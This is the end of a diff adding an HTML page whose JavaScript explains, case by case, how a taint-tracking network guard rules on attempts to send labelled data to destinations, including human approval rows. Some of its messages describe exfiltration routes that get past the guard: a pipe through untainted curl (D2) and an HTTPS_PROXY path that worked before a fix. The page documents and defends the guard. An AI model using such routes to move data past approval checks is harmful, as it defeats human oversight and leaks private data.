+      if (!plan) return chip("raw", "leak") + "curl's " + code("connect()") + " checks curl and its ancestors. They are untainted, so it passes and the bytes leave through the pipe (D2).";
+      if (bound) return chip("ok", "allowed") + code(sink) + " is in " + code(release(o)) + ".";
+      return chip("ask", "blocked: ask") + "Checked at the later event. If curl connected first, python3's raw open is the later event: it finds the tree holding a socket to " + code(sink) + ", outside " + code(release(o)) + ", and becomes an ask. If python3 read first, curl's " + code("connect()") + " is checked against the tree's label: an ask. The bytes leave only if the human allows it.";
+    }
+    if (sub === "proxy") {
+      if (!plan) return bound ? chip("ok", "allowed") + code(sink) + " is a binding of " + code(o.name) + "." :
+        chip("ask", "blocked: ask") + "Through " + code("HTTPS_PROXY") + " the request goes to the proxy's port, which the guard exempts; the net-proxy resolves python3 on the HTTPS leg and checks its bindings (D6, fixed 2026-10-02): " + code(sink) + " is not one, so the request is refused with an approval row. Before the fix the bytes reached " + code(sink) + ".";
+      if (bound) return chip("ok", "allowed") + "The net-proxy resolves python3 on the HTTPS leg; " + code(sink) + " is in " + code(release(o)) + ".";
+      return chip("ask", "ask") + "The net-proxy resolves python3 on the HTTPS leg and checks " + code("Label(holder)") + ": " + code(sink) + " is not in " + code(release(o)) + ". A " + code("CONNECT") + " it cannot decrypt for a holder like this one is refused.";
+    }
+    if (bound) return chip("ok", "allowed") + "The " + (plan ? "holder" : "tainted process") + " may " + code("connect()") + " to a binding of its data (" + code(sink) + ").";
+    if (!plan) return chip("deny", "EACCES") + "A tainted process may " + code("connect()") + " directly only to bound destinations. " + code(sink) + " is not one; an Inbox row can approve it.";
+    return chip("ask", "ask") + code(sink) + " is not in " + code(release(o)) + ". The Inbox row offers Deny, Allow once, Allow this session and Always; only Always writes to the policy. A connection opened before the read is caught at the read (the later event).";
+  }
+
+  function decide(objKey, sub, sink, isPlan) {
+    plan = isPlan;
+    var o = OBJ[objKey], r = read(o, sub);
+    return { read: r, hold: hold(o, sub, r).html, send: send(o, sub, r, sink) };
+  }
+
+  function render() {
+    var d = decide($("ex-obj").value, $("ex-sub").value, $("ex-sink").value, plan);
+    $("ex-read").innerHTML = d.read.html;
+    $("ex-hold").innerHTML = d.hold;
+    $("ex-send").innerHTML = d.send;
+  }
+  function setMode(p) {
+    plan = p;
+    $("ex-today").setAttribute("aria-pressed", String(!p));
+    $("ex-plan").setAttribute("aria-pressed", String(p));
+    render();
+  }
+  ["ex-obj", "ex-sub", "ex-sink"].forEach(function (id) { $(id).addEventListener("change", render); });
+  $("ex-today").addEventListener("click", function () { setMode(false); });
+  $("ex-plan").addEventListener("click", function () { setMode(true); });
+  render();
+})();
+</script>
+
+</main>
+</body>
+</html>
